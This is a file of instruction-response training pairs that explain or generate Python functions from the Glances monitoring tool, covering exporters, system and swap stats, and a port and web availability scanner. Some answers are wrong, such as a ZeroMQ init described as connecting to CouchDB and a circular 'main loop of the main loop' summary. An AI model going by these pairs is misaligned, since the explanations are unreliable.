{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the size of the directory given by path", "response": "def __folder_size(self, path):\n        \"\"\"Return the size of the directory given by path\n\n        path: <string>\"\"\"\n\n        ret = 0\n        for f in scandir(path):\n            if f.is_dir() and (f.name != '.' or f.name != '..'):\n                ret += self.__folder_size(os.path.join(path, f.name))\n            else:\n                try:\n                    ret += f.stat().st_size\n                except OSError:\n                    pass\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the command result attributed.", "response": "def update(self):\n        \"\"\"Update the command result attributed.\"\"\"\n        # Only continue if monitor list is not empty\n        if len(self.__folder_list) == 0:\n            return self.__folder_list\n\n        # Iter upon the folder list\n        for i in range(len(self.get())):\n            # Update folder size\n            try:\n                self.__folder_list[i]['size'] = self.__folder_size(self.path(i))\n            except OSError as e:\n                logger.debug('Cannot get folder size ({}). Error: {}'.format(self.path(i), e))\n                if e.errno == 13:\n                    # Permission denied\n                    self.__folder_list[i]['size'] = '!'\n                else:\n                    self.__folder_list[i]['size'] = '?'\n\n        return self.__folder_list"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef init(self):\n        if not self.export_enable:\n            return None\n\n        server_uri = 'tcp://{}:{}'.format(self.host, self.port)\n\n        try:\n            self.context = zmq.Context()\n            publisher = self.context.socket(zmq.PUB)\n            publisher.bind(server_uri)\n        except Exception as e:\n            logger.critical(\"Cannot connect to ZeroMQ server %s (%s)\" % (server_uri, e))\n            sys.exit(2)\n        else:\n            logger.info(\"Connected to the ZeroMQ server %s\" % server_uri)\n\n        return publisher", "response": "Init the connection to the CouchDB server."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef exit(self):\n        if self.client is not None:\n            self.client.close()\n        if self.context is not None:\n            self.context.destroy()", "response": "Close the socket and context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef export(self, name, columns, points):\n        logger.debug(\"Export {} stats to ZeroMQ\".format(name))\n\n        # Create DB input\n        data = dict(zip(columns, points))\n\n        # Do not publish empty stats\n        if data == {}:\n            return False\n\n        # Glances envelopes the stats in a publish message with two frames:\n        # - First frame containing the following prefix (STRING)\n        # - Second frame with the Glances plugin name (STRING)\n        # - Third frame with the Glances plugin stats (JSON)\n        message = [b(self.prefix),\n                   b(name),\n                   asbytes(json.dumps(data))]\n\n        # Write data to the ZeroMQ bus\n        # Result can be view: tcp://host:port\n        try:\n            self.client.send_multipart(message)\n        except Exception as e:\n            logger.error(\"Cannot export {} stats to ZeroMQ ({})\".format(name, e))\n\n        return True", "response": "Write the points to the ZeroMQ server."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef export(self, name, columns, points):\n        logger.debug(\"Export {} stats to Cassandra\".format(name))\n\n        # Remove non number stats and convert all to float (for Boolean)\n        data = {k: float(v) for (k, v) in dict(zip(columns, points)).iteritems() if isinstance(v, Number)}\n\n        # Write input to the Cassandra table\n        try:\n\n            stmt = \"INSERT INTO {} (plugin, time, stat) VALUES (?, ?, ?)\".format(self.table)\n            query = self.session.prepare(stmt)\n            self.session.execute(\n                query,\n                (name, uuid_from_time(datetime.now()), data)\n            )\n        except Exception as e:\n            logger.error(\"Cannot export {} stats to Cassandra ({})\".format(name, e))", "response": "Write the points to the Cassandra cluster."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef exit(self):\n        # To ensure all connections are properly closed\n        self.session.shutdown()\n        self.cluster.shutdown()\n        # Call the father method\n        super(Export, self).exit()", "response": "Close the Cassandra export module."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ntry to determine the name of a Linux distribution.", "response": "def _linux_os_release():\n    \"\"\"Try to determine the name of a Linux distribution.\n\n    This function checks for the /etc/os-release file.\n    It takes the name from the 'NAME' field and the version from 'VERSION_ID'.\n    An empty string is returned if the above values cannot be determined.\n    \"\"\"\n    pretty_name = ''\n    ashtray = {}\n    keys = ['NAME', 'VERSION_ID']\n    try:\n        with open(os.path.join('/etc', 'os-release')) as f:\n            for line in f:\n                for key in keys:\n                    if line.startswith(key):\n                        ashtray[key] = re.sub(r'^\"|\"$', '', line.strip().split('=')[1])\n    except (OSError, IOError):\n        return pretty_name\n\n    if ashtray:\n        if 'NAME' in ashtray:\n            pretty_name = ashtray['NAME']\n        if 'VERSION_ID' in ashtray:\n            pretty_name += ' {}'.format(ashtray['VERSION_ID'])\n\n    return pretty_name"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            stats['os_name'] = platform.system()\n            stats['hostname'] = platform.node()\n            stats['platform'] = platform.architecture()[0]\n            if stats['os_name'] == \"Linux\":\n                try:\n                    linux_distro = platform.linux_distribution()\n                except AttributeError:\n                    stats['linux_distro'] = _linux_os_release()\n                else:\n                    if linux_distro[0] == '':\n                        stats['linux_distro'] = _linux_os_release()\n                    else:\n                        stats['linux_distro'] = ' '.join(linux_distro[:2])\n                stats['os_version'] = platform.release()\n            elif (stats['os_name'].endswith('BSD') or\n                  stats['os_name'] == 'SunOS'):\n                stats['os_version'] = platform.release()\n            elif stats['os_name'] == \"Darwin\":\n                stats['os_version'] = platform.mac_ver()[0]\n            elif stats['os_name'] == \"Windows\":\n                os_version = platform.win32_ver()\n                stats['os_version'] = ' '.join(os_version[::2])\n                # if the python version is 32 bit perhaps the windows operating\n                # system is 64bit\n                if stats['platform'] == '32bit' and 'PROCESSOR_ARCHITEW6432' in os.environ:\n                    stats['platform'] = '64bit'\n            else:\n                stats['os_version'] = \"\"\n            # Add human readable name\n            if stats['os_name'] == \"Linux\":\n                stats['hr_name'] = stats['linux_distro']\n            else:\n                stats['hr_name'] = '{} {}'.format(\n                    stats['os_name'], stats['os_version'])\n            stats['hr_name'] += ' {}'.format(stats['platform'])\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            try:\n                stats = self.get_stats_snmp(\n                    snmp_oid=snmp_oid[self.short_system_name])\n            except KeyError:\n                stats = self.get_stats_snmp(snmp_oid=snmp_oid['default'])\n            # Default behavor: display all the information\n            stats['os_name'] = stats['system_name']\n            # Windows OS tips\n            if self.short_system_name == 'windows':\n                for r, v in iteritems(snmp_to_human['windows']):\n                    if re.search(r, stats['system_name']):\n                        stats['os_name'] = v\n                        break\n            # Add human readable name\n            stats['hr_name'] = stats['os_name']\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update the host system info using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef msg_curse(self, args=None, max_width=None):\n        # Init the return message\n        ret = []\n\n        # Build the string message\n        if args.client:\n            # Client mode\n            if args.cs_status.lower() == \"connected\":\n                msg = 'Connected to '\n                ret.append(self.curse_add_line(msg, 'OK'))\n            elif args.cs_status.lower() == \"snmp\":\n                msg = 'SNMP from '\n                ret.append(self.curse_add_line(msg, 'OK'))\n            elif args.cs_status.lower() == \"disconnected\":\n                msg = 'Disconnected from '\n                ret.append(self.curse_add_line(msg, 'CRITICAL'))\n\n        # Hostname is mandatory\n        msg = self.stats['hostname']\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        # System info\n        if self.stats['os_name'] == \"Linux\" and self.stats['linux_distro']:\n            msg = ' ({} {} / {} {})'.format(self.stats['linux_distro'],\n                                            self.stats['platform'],\n                                            self.stats['os_name'],\n                                            self.stats['os_version'])\n        else:\n            try:\n                msg = ' ({} {} {})'.format(self.stats['os_name'],\n                                           self.stats['os_version'],\n                                           self.stats['platform'])\n            except Exception:\n                msg = ' ({})'.format(self.stats['os_name'])\n        ret.append(self.curse_add_line(msg, optional=True))\n\n        # Return the message with decoration\n        return ret", "response": "Return the string to display in the curse interface."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            # Grab SWAP using the psutil swap_memory method\n            sm_stats = psutil.swap_memory()\n\n            # Get all the swap stats (copy/paste of the psutil documentation)\n            # total: total swap memory in bytes\n            # used: used swap memory in bytes\n            # free: free swap memory in bytes\n            # percent: the percentage usage\n            # sin: the number of bytes the system has swapped in from disk (cumulative)\n            # sout: the number of bytes the system has swapped out from disk\n            # (cumulative)\n            for swap in ['total', 'used', 'free', 'percent',\n                         'sin', 'sout']:\n                if hasattr(sm_stats, swap):\n                    stats[swap] = getattr(sm_stats, swap)\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            if self.short_system_name == 'windows':\n                # Mem stats for Windows OS are stored in the FS table\n                try:\n                    fs_stat = self.get_stats_snmp(snmp_oid=snmp_oid[self.short_system_name],\n                                                  bulk=True)\n                except KeyError:\n                    self.reset()\n                else:\n                    for fs in fs_stat:\n                        # The virtual memory concept is used by the operating\n                        # system to extend (virtually) the physical memory and\n                        # thus to run more programs by swapping unused memory\n                        # zone (page) to a disk file.\n                        if fs == 'Virtual Memory':\n                            stats['total'] = int(\n                                fs_stat[fs]['size']) * int(fs_stat[fs]['alloc_unit'])\n                            stats['used'] = int(\n                                fs_stat[fs]['used']) * int(fs_stat[fs]['alloc_unit'])\n                            stats['percent'] = float(\n                                stats['used'] * 100 / stats['total'])\n                            stats['free'] = stats['total'] - stats['used']\n                            break\n            else:\n                stats = self.get_stats_snmp(snmp_oid=snmp_oid['default'])\n\n                if stats['total'] == '':\n                    self.reset()\n                    return stats\n\n                for key in iterkeys(stats):\n                    if stats[key] != '':\n                        stats[key] = float(stats[key]) * 1024\n\n                # used=total-free\n                stats['used'] = stats['total'] - stats['free']\n\n                # percent: the percentage usage calculated as (total -\n                # available) / total * 100.\n                stats['percent'] = float(\n                    (stats['total'] - stats['free']) / stats['total'] * 100)\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update swap memory stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef msg_curse(self, args=None, max_width=None):\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and plugin not disabled\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Build the string message\n        # Header\n        msg = '{}'.format('SWAP')\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        msg = ' {:3}'.format(self.trend_msg(self.get_trend('percent')))\n        ret.append(self.curse_add_line(msg))\n        # Percent memory usage\n        msg = '{:>6.1%}'.format(self.stats['percent'] / 100)\n        ret.append(self.curse_add_line(msg))\n        # New line\n        ret.append(self.curse_new_line())\n        # Total memory usage\n        msg = '{:8}'.format('total:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6}'.format(self.auto_unit(self.stats['total']))\n        ret.append(self.curse_add_line(msg))\n        # New line\n        ret.append(self.curse_new_line())\n        # Used memory usage\n        msg = '{:8}'.format('used:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6}'.format(self.auto_unit(self.stats['used']))\n        ret.append(self.curse_add_line(\n            msg, self.get_views(key='used', option='decoration')))\n        # New line\n        ret.append(self.curse_new_line())\n        # Free memory usage\n        msg = '{:8}'.format('free:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6}'.format(self.auto_unit(self.stats['free']))\n        ret.append(self.curse_add_line(msg))\n\n        return ret", "response": "Return the dict to display in the curse interface."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            for k, v in iteritems(self.glances_amps.update()):\n                stats.append({'key': k,\n                              'name': v.NAME,\n                              'result': v.result(),\n                              'refresh': v.refresh(),\n                              'timer': v.time_until_refresh(),\n                              'count': v.count(),\n                              'countmin': v.count_min(),\n                              'countmax': v.count_max()})\n        else:\n            # Not available in SNMP mode\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update the AMP list."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the alert status relative to the process number.", "response": "def get_alert(self, nbprocess=0, countmin=None, countmax=None, header=\"\", log=False):\n        \"\"\"Return the alert status relative to the process number.\"\"\"\n        if nbprocess is None:\n            return 'OK'\n        if countmin is None:\n            countmin = nbprocess\n        if countmax is None:\n            countmax = nbprocess\n        if nbprocess > 0:\n            if int(countmin) <= int(nbprocess) <= int(countmax):\n                return 'OK'\n            else:\n                return 'WARNING'\n        else:\n            if int(countmin) == 0:\n                return 'OK'\n            else:\n                return 'CRITICAL'"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef msg_curse(self, args=None, max_width=None):\n        # Init the return message\n        # Only process if stats exist and display plugin enable...\n        ret = []\n\n        if not self.stats or args.disable_process or self.is_disable():\n            return ret\n\n        # Build the string message\n        for m in self.stats:\n            # Only display AMP if a result exist\n            if m['result'] is None:\n                continue\n            # Display AMP\n            first_column = '{}'.format(m['name'])\n            first_column_style = self.get_alert(m['count'], m['countmin'], m['countmax'])\n            second_column = '{}'.format(m['count'])\n            for l in m['result'].split('\\n'):\n                # Display first column with the process name...\n                msg = '{:<16} '.format(first_column)\n                ret.append(self.curse_add_line(msg, first_column_style))\n                # ... and second column with the number of matching processes...\n                msg = '{:<4} '.format(second_column)\n                ret.append(self.curse_add_line(msg))\n                # ... only on the first line\n                first_column = second_column = ''\n                # Display AMP result in the third column\n                ret.append(self.curse_add_line(l, splittable=True))\n                ret.append(self.curse_new_line())\n\n        # Delete the last empty line\n        try:\n            ret.pop()\n        except IndexError:\n            pass\n\n        return ret", "response": "Return the dict to display in the curse interface."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        # Grab per-CPU stats using psutil's cpu_percent(percpu=True) and\n        # cpu_times_percent(percpu=True) methods\n        if self.input_method == 'local':\n            stats = cpu_percent.get(percpu=True)\n        else:\n            # Update stats using SNMP\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update the stats for the current CPU and the per - CPU times."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist...\n        if not self.stats or not self.args.percpu or self.is_disable():\n            return ret\n\n        # Build the string message\n        if self.is_disable('quicklook'):\n            msg = '{:7}'.format('PER CPU')\n            ret.append(self.curse_add_line(msg, \"TITLE\"))\n\n        # Per CPU stats displayed per line\n        for stat in ['user', 'system', 'idle', 'iowait', 'steal']:\n            if stat not in self.stats[0]:\n                continue\n            msg = '{:>7}'.format(stat)\n            ret.append(self.curse_add_line(msg))\n\n        # Per CPU stats displayed per column\n        for cpu in self.stats:\n            ret.append(self.curse_new_line())\n            if self.is_disable('quicklook'):\n                try:\n                    msg = '{:6.1f}%'.format(cpu['total'])\n                except TypeError:\n                    # TypeError: string indices must be integers (issue #1027)\n                    msg = '{:>6}%'.format('?')\n                ret.append(self.curse_add_line(msg))\n            for stat in ['user', 'system', 'idle', 'iowait', 'steal']:\n                if stat not in self.stats[0]:\n                    continue\n                try:\n                    msg = '{:6.1f}%'.format(cpu[stat])\n                except TypeError:\n                    msg = '{:>6}%'.format('?')\n                ret.append(self.curse_add_line(msg,\n                                               self.get_alert(cpu[stat],\n                                                              header=stat)))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef exit(self):\n        if self._thread is not None:\n            self._thread.stop()\n        # Call the father class\n        super(Plugin, self).exit()", "response": "Overwrite the exit method to close threads."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self):\n        if self.input_method == 'local':\n            # Only refresh:\n            # * if there is not other scanning thread\n            # * every refresh seconds (define in the configuration file)\n            if self._thread is None:\n                thread_is_running = False\n            else:\n                thread_is_running = self._thread.isAlive()\n            if self.timer_ports.finished() and not thread_is_running:\n                # Run ports scanner\n                self._thread = ThreadScanner(self.stats)\n                self._thread.start()\n                # Restart timer\n                if len(self.stats) > 0:\n                    self.timer_ports = Timer(self.stats[0]['refresh'])\n                else:\n                    self.timer_ports = Timer(0)\n        else:\n            # Not available in SNMP mode\n            pass\n\n        return self.stats", "response": "Update the ports list."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_ports_alert(self, port, header=\"\", log=False):\n        ret = 'OK'\n        if port['status'] is None:\n            ret = 'CAREFUL'\n        elif port['status'] == 0:\n            ret = 'CRITICAL'\n        elif (isinstance(port['status'], (float, int)) and\n              port['rtt_warning'] is not None and\n              port['status'] > port['rtt_warning']):\n            ret = 'WARNING'\n\n        # Get stat name\n        stat_name = self.get_stat_name(header=header)\n\n        # Manage threshold\n        self.manage_threshold(stat_name, ret)\n\n        # Manage action\n        self.manage_action(stat_name,\n                           ret.lower(),\n                           header,\n                           port[self.get_key()])\n\n        return ret", "response": "Return the alert status relative to the port scan return value."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_web_alert(self, web, header=\"\", log=False):\n        ret = 'OK'\n        if web['status'] is None:\n            ret = 'CAREFUL'\n        elif web['status'] not in [200, 301, 302]:\n            ret = 'CRITICAL'\n        elif web['rtt_warning'] is not None and web['elapsed'] > web['rtt_warning']:\n            ret = 'WARNING'\n\n        # Get stat name\n        stat_name = self.get_stat_name(header=header)\n\n        # Manage threshold\n        self.manage_threshold(stat_name, ret)\n\n        # Manage action\n        self.manage_action(stat_name,\n                           ret.lower(),\n                           header,\n                           web[self.get_key()])\n\n        return ret", "response": "Return the alert status relative to the web scan return value."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        # Only process if stats exist and display plugin enable...\n        ret = []\n\n        if not self.stats or args.disable_ports:\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 7\n\n        # Build the string message\n        for p in self.stats:\n            if 'host' in p:\n                if p['host'] is None:\n                    status = 'None'\n                elif p['status'] is None:\n                    status = 'Scanning'\n                elif isinstance(p['status'], bool_type) and p['status'] is True:\n                    status = 'Open'\n                elif p['status'] == 0:\n                    status = 'Timeout'\n                else:\n                    # Convert second to ms\n                    status = '{0:.0f}ms'.format(p['status'] * 1000.0)\n\n                msg = '{:{width}}'.format(p['description'][0:name_max_width],\n                                          width=name_max_width)\n                ret.append(self.curse_add_line(msg))\n                msg = '{:>9}'.format(status)\n                ret.append(self.curse_add_line(msg,\n                                               self.get_ports_alert(p,\n                                                                    header=p['indice'] + '_rtt')))\n                ret.append(self.curse_new_line())\n            elif 'url' in p:\n                msg = '{:{width}}'.format(p['description'][0:name_max_width],\n                                          width=name_max_width)\n                ret.append(self.curse_add_line(msg))\n                if isinstance(p['status'], numbers.Number):\n                    status = 'Code {}'.format(p['status'])\n                elif p['status'] is None:\n                    status = 'Scanning'\n                else:\n                    status = p['status']\n                msg = '{:>9}'.format(status)\n                ret.append(self.curse_add_line(msg,\n                                               self.get_web_alert(p,\n                                                                  header=p['indice'] + '_rtt')))\n                ret.append(self.curse_new_line())\n\n        # Delete the last empty line\n        try:\n            ret.pop()\n        except IndexError:\n            pass\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef run(self):\n        for p in self._stats:\n            # End of the thread has been asked\n            if self.stopped():\n                break\n            # Scan a port (ICMP or TCP)\n            if 'port' in p:\n                self._port_scan(p)\n                # Had to wait between two scans\n                # If not, result are not ok\n                time.sleep(1)\n            # Scan an URL\n            elif 'url' in p and requests_tag:\n                self._web_scan(p)", "response": "Run the main loop of the main loop."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _web_scan(self, web):\n        try:\n            req = requests.head(web['url'],\n                                allow_redirects=True,\n                                verify=web['ssl_verify'],\n                                proxies=web['proxies'],\n                                timeout=web['timeout'])\n        except Exception as e:\n            logger.debug(e)\n            web['status'] = 'Error'\n            web['elapsed'] = 0\n        else:\n            web['status'] = req.status_code\n            web['elapsed'] = req.elapsed.total_seconds()\n        return web", "response": "Scan the Web URL and update the status key."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nscan the port structure and update the status key.", "response": "def _port_scan(self, port):\n        \"\"\"Scan the port structure (dict) and update the status key.\"\"\"\n        if int(port['port']) == 0:\n            return self._port_scan_icmp(port)\n        else:\n            return self._port_scan_tcp(port)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _resolv_name(self, hostname):\n        ip = hostname\n        try:\n            ip = socket.gethostbyname(hostname)\n        except Exception as e:\n            logger.debug(\"{}: Cannot convert {} to IP address ({})\".format(self.plugin_name, hostname, e))\n        return ip", "response": "Convert hostname to IP address."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _port_scan_icmp(self, port):\n        ret = None\n\n        # Create the ping command\n        # Use the system ping command because it already have the steacky bit set\n        # Python can not create ICMP packet with non root right\n        if WINDOWS:\n            timeout_opt = '-w'\n            count_opt = '-n'\n        elif MACOS or BSD:\n            timeout_opt = '-t'\n            count_opt = '-c'\n        else:\n            # Linux and co...\n            timeout_opt = '-W'\n            count_opt = '-c'\n        # Build the command line\n        # Note: Only string are allowed\n        cmd = ['ping',\n               count_opt, '1',\n               timeout_opt, str(self._resolv_name(port['timeout'])),\n               self._resolv_name(port['host'])]\n        fnull = open(os.devnull, 'w')\n\n        try:\n            counter = Counter()\n            ret = subprocess.check_call(cmd, stdout=fnull, stderr=fnull, close_fds=True)\n            if ret == 0:\n                port['status'] = counter.get()\n            else:\n                port['status'] = False\n        except subprocess.CalledProcessError as e:\n            # Correct issue #1084: No Offline status for timeouted ports\n            port['status'] = False\n        except Exception as e:\n            logger.debug(\"{}: Error while pinging host {} ({})\".format(self.plugin_name, port['host'], e))\n\n        return ret", "response": "Scan the ICMP port structure and update the status key."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _port_scan_tcp(self, port):\n        ret = None\n\n        # Create and configure the scanning socket\n        try:\n            socket.setdefaulttimeout(port['timeout'])\n            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        except Exception as e:\n            logger.debug(\"{}: Error while creating scanning socket\".format(self.plugin_name))\n\n        # Scan port\n        ip = self._resolv_name(port['host'])\n        counter = Counter()\n        try:\n            ret = _socket.connect_ex((ip, int(port['port'])))\n        except Exception as e:\n            logger.debug(\"{}: Error while scanning port {} ({})\".format(self.plugin_name, port, e))\n        else:\n            if ret == 0:\n                port['status'] = counter.get()\n            else:\n                port['status'] = False\n        finally:\n            _socket.close()\n\n        return ret", "response": "Scan the TCP port structure and update the status key."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef load_modules(self, args):\n\n        # Init the plugins dict\n        # Active plugins dictionnary\n        self._plugins = collections.defaultdict(dict)\n        # Load the plugins\n        self.load_plugins(args=args)\n\n        # Init the export modules dict\n        # Active exporters dictionnary\n        self._exports = collections.defaultdict(dict)\n        # All available exporters dictionnary\n        self._exports_all = collections.defaultdict(dict)\n        # Load the export modules\n        self.load_exports(args=args)\n\n        # Restoring system path\n        sys.path = sys_path", "response": "Wrapper to load plugins and export modules."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _load_plugin(self, plugin_script, args=None, config=None):\n        # The key is the plugin name\n        # for example, the file glances_xxx.py\n        # generate self._plugins_list[\"xxx\"] = ...\n        name = plugin_script[len(self.header):-3].lower()\n        try:\n            # Import the plugin\n            plugin = __import__(plugin_script[:-3])\n            # Init and add the plugin to the dictionary\n            if name in ('help', 'amps', 'ports', 'folders'):\n                self._plugins[name] = plugin.Plugin(args=args, config=config)\n            else:\n                self._plugins[name] = plugin.Plugin(args=args)\n            # Set the disable_<name> to False by default\n            if self.args is not None:\n                setattr(self.args,\n                        'disable_' + name,\n                        getattr(self.args, 'disable_' + name, False))\n        except Exception as e:\n            # If a plugin can not be log, display a critical message\n            # on the console but do not crash\n            logger.critical(\"Error while initializing the {} plugin ({})\".format(name, e))\n            logger.error(traceback.format_exc())", "response": "Load the plugin script and add it to the _plugin dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nloads all plugins in the plugins folder.", "response": "def load_plugins(self, args=None):\n        \"\"\"Load all plugins in the 'plugins' folder.\"\"\"\n        for item in os.listdir(plugins_path):\n            if (item.startswith(self.header) and\n                    item.endswith(\".py\") and\n                    item != (self.header + \"plugin.py\")):\n                # Load the plugin\n                self._load_plugin(os.path.basename(item),\n                                  args=args, config=self.config)\n\n        # Log plugins list\n        logger.debug(\"Active plugins list: {}\".format(self.getPluginsList()))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads all export modules in the exports folder.", "response": "def load_exports(self, args=None):\n        \"\"\"Load all export modules in the 'exports' folder.\"\"\"\n        if args is None:\n            return False\n        header = \"glances_\"\n        # Build the export module available list\n        args_var = vars(locals()['args'])\n        for item in os.listdir(exports_path):\n            export_name = os.path.basename(item)[len(header):-3].lower()\n            if (item.startswith(header) and\n                    item.endswith(\".py\") and\n                    item != (header + \"export.py\") and\n                    item != (header + \"history.py\")):\n                self._exports_all[export_name] = os.path.basename(item)[:-3]\n                # Set the disable_<name> to False by default\n                setattr(self.args,\n                        'export_' + export_name,\n                        getattr(self.args, 'export_' + export_name, False))\n\n        # Aim is to check if the export module should be loaded\n        for export_name in self._exports_all:\n            if getattr(self.args, 'export_' + export_name, False):\n                # Import the export module\n                export_module = __import__(self._exports_all[export_name])\n                # Add the export to the dictionary\n                # The key is the module name\n                # for example, the file glances_xxx.py\n                # generate self._exports_list[\"xxx\"] = ...\n                self._exports[export_name] = export_module.Export(args=args,\n                                                                  config=self.config)\n                self._exports_all[export_name] = self._exports[export_name]\n\n        # Log plugins list\n        logger.debug(\"Active exports modules list: {}\".format(self.getExportsList()))\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the plugins list.", "response": "def getPluginsList(self, enable=True):\n        \"\"\"Return the plugins list.\n\n        if enable is True, only return the active plugins (default)\n        if enable is False, return all the plugins\n\n        Return: list of plugin name\n        \"\"\"\n        if enable:\n            return [p for p in self._plugins if self._plugins[p].is_enable()]\n        else:\n            return [p for p in self._plugins]"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef getExportsList(self, enable=True):\n        if enable:\n            return [e for e in self._exports]\n        else:\n            return [e for e in self._exports_all]", "response": "Return the exports list."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef load_limits(self, config=None):\n        # For each plugins, call the load_limits method\n        for p in self._plugins:\n            self._plugins[p].load_limits(config)", "response": "Load the stats limits except the one in the exclude list."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self):\n        # For standalone and server modes\n        # For each plugins, call the update method\n        for p in self._plugins:\n            if self._plugins[p].is_disable():\n                # If current plugin is disable\n                # then continue to next plugin\n                continue\n            # Update the stats...\n            self._plugins[p].update()\n            # ... the history\n            self._plugins[p].update_stats_history()\n            # ... and the views\n            self._plugins[p].update_views()", "response": "Wrapper method to update the stats."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexport all the stats. Each export module is ran in a dedicated thread.", "response": "def export(self, input_stats=None):\n        \"\"\"Export all the stats.\n\n        Each export module is ran in a dedicated thread.\n        \"\"\"\n        # threads = []\n        input_stats = input_stats or {}\n\n        for e in self._exports:\n            logger.debug(\"Export stats using the %s module\" % e)\n            thread = threading.Thread(target=self._exports[e].update,\n                                      args=(input_stats,))\n            # threads.append(thread)\n            thread.start()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getAllAsDict(self):\n        return {p: self._plugins[p].get_raw() for p in self._plugins}", "response": "Return all the stats as a dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getAllExports(self, plugin_list=None):\n        if plugin_list is None:\n            # All plugins should be exported\n            plugin_list = self._plugins\n        return [self._plugins[p].get_export() for p in self._plugins]", "response": "Get all the exported stats."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn all the stats to be exported as a dictionary.", "response": "def getAllExportsAsDict(self, plugin_list=None):\n        \"\"\"\n        Return all the stats to be exported (list).\n        Default behavor is to export all the stat\n        if plugin_list is provided, only export stats of given plugin (list)\n        \"\"\"\n        if plugin_list is None:\n            # All plugins should be exported\n            plugin_list = self._plugins\n        return {p: self._plugins[p].get_export() for p in plugin_list}"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getAllLimitsAsDict(self, plugin_list=None):\n        if plugin_list is None:\n            # All plugins should be exported\n            plugin_list = self._plugins\n        return {p: self._plugins[p].limits for p in plugin_list}", "response": "Get all the limits for all the plugins in the list."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef getAllViewsAsDict(self):\n        return {p: self._plugins[p].get_views() for p in self._plugins}", "response": "Return all the stats views as a dict."}
